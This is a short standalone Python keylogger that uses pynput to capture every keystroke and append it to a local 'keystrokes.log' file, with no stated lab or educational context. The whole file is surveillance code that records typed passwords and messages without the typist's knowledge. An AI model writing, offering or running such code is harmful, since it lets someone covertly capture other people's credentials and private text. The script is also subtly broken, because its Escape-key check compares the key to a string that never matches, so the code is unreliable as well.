from pynput.keyboard import Listener

log_file = "keystrokes.log"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(str(key.char))
    except AttributeError:
        # If special key (e.g., shift, ctrl) is pressed
        with open(log_file, "a") as f:
            f.write(str(key))

def on_release(key):
    if key == "Key.esc":
        return False

def main():
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()
